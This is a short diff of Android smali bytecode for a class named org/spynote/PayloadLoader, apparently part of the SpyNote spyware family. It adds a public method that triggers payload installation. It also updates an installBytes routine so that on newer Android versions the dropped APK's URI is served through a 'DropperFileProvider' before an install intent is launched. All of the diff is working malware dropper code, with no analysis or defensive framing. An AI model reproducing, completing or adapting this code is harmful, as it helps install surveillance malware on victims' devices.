@@ -77,7 +77,11 @@
 .end method
 
 
-
+.method public static installFromUi(Landroid/content/Context;)V
+    .locals 0
+    invoke-static {p0}, Lorg/spynote/PayloadLoader;->tryInstall(Landroid/content/Context;)Z
+    return-void
+.end method
 
 
 .method private static tryInstall(Landroid/content/Context;)Z
@@ -404,7 +408,7 @@
 
 .method private static installBytes(Landroid/content/Context;[B)Z
 
-    .locals 5
+    .locals 7
 
     :try_start_0
 
@@ -440,9 +444,25 @@
 
     invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
 
+    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v4, 0x18
+
+    if-lt v3, v4, :legacy_uri
+
+    invoke-static {p0, v0}, Lorg/spynote/DropperFileProvider;->getUriForFile(Landroid/content/Context;Ljava/io/File;)Landroid/net/Uri;
+
+    move-result-object v0
+
+    goto :set_type
+
+    :legacy_uri
+
     invoke-static {v0}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;
 
     move-result-object v0
+
+    :set_type
 
     const-string v3, "application/vnd.android.package-archive"
 
